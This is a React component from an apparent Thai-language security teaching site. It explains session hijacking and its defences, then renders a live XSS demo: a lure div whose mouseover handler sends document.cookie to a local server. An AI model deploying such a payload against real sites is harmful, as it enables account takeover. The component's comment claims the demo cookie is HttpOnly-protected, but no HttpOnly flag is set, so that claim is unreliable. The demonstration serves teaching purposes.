import React from 'react'

function SessionHijacking() {

    const textRead = `
     <div style={{marginTop:"20px"}}>
    <h1>Session Hijacking (เซสชันไฮแจ็คกิ้ง) คืออะไร</h1>
<p>
  <strong>Session Hijacking</strong> (เซสชันไฮแจ็คกิ้ง) คือเทคนิคการโจมตีที่แฮกเกอร์ “ขโมย” หรือ “แอบใช้” session ของผู้ใช้คนอื่น เพื่อแอบอ้างเป็นผู้ใช้คนนั้น โดยไม่ต้องรู้รหัสผ่านของเหยื่อเลย
</p>

<h2>🔐 Session คืออะไร?</h2>
<p>
  เมื่อผู้ใช้ล็อกอิน ระบบจะสร้าง <em>session ID</em> เพื่อใช้ระบุว่าใครกำลังใช้งานอยู่ เช่น token ที่แนบในคุกกี้หรือ localStorage
  หากมีใครได้ session ID ไป เขาก็สามารถปลอมตัวเป็นผู้ใช้นั้นได้ทันที
</p>

<h2>🧨 วิธีที่แฮกเกอร์อาจใช้ขโมย session</h2>
<ul>
  <li>ขโมยผ่าน <strong>XSS</strong>: inject JavaScript เพื่อดึงค่า session ออกจากคุกกี้</li>
  <li>ขโมยผ่าน <strong>การเชื่อมต่อไม่เข้ารหัส (HTTP)</strong>: ดักข้อมูลบนเครือข่าย (man-in-the-middle)</li>
  <li>ใช้ <strong>มัลแวร์ฝังในเครื่องเหยื่อ</strong> เพื่ออ่าน session</li>
  <li>การใช้ <strong>Session Fixation</strong>: บังคับให้เหยื่อใช้ session ที่แฮกเกอร์สร้างไว้</li>
</ul>

<h2>🎯 ตัวอย่างผลที่เกิดจากการ Hijack:</h2>
<ul>
  <li>เข้าบัญชีของเหยื่อโดยไม่ต้องรู้รหัสผ่าน</li>
  <li>สั่งซื้อสินค้า, โอนเงิน, หรือดูข้อมูลส่วนตัวของเหยื่อได้</li>
  <li>ใช้บัญชีแอดมินหรือสิทธิพิเศษต่าง ๆ โดยไม่ต้องผ่านการยืนยัน</li>
</ul>

<h2>🛡 วิธีป้องกัน:</h2>
<ul>
  <li>ใช้ <strong>HTTPS</strong> ทุกหน้าเสมอ</li>
  <li>ตั้ง <strong>session expiration</strong> (หมดอายุอัตโนมัติ)</li>
  <li>ผูก session กับ <strong>IP</strong> หรือ <strong>User-Agent</strong></li>
  <li>ทำการ <strong>regenerate session ID</strong> หลังล็อกอิน</li>
  <li>ตรวจสอบพฤติกรรมแปลก ๆ ระหว่าง session</li>
</ul>
</div>
`
    // ตัวอย่าง XSS โจมตีเพื่อขโมยเซสชัน
            const userInput = `<div style="width: 100px; height: 100px; background: red;"
                                onmouseover="try {
                                    fetch('http://localhost:3001', {
                                        method: 'POST',
                                body: JSON.stringify({ session: document.cookie }),
                                headers: { 'Content-Type': 'application/json' }
                                    }).catch(error => console.log('Fetch error:', error));
                                } catch (e) {
                                    console.log('Script error:', e);
                                }">
                                Hover เพื่อรับรางวัล!
                            </div>`;

    React.useEffect(() => {
        // set the cookie protected by HttpOnly flag to prevent XSS attack and session hijacking attack

        document.cookie = "s=eeeee; Secure; SameSite=Strict"; // สร้างคุกกี้ที่ป้องกันการโจมตี XSS
    }, []);

    return (
        <div style={{marginTop:"80px",paddingBottom:"20px"}}>
             <div dangerouslySetInnerHTML={{ __html: textRead }} style={{marginTop:"20px"}}></div>

            <h1>ตัวอย่าง Session Hijacking</h1>
            <p>โจมตี XSS เพื่อขโมยเซสชัน</p>
            <div dangerouslySetInnerHTML={{ __html: userInput }} />
           
        </div>

    )
}

export default SessionHijacking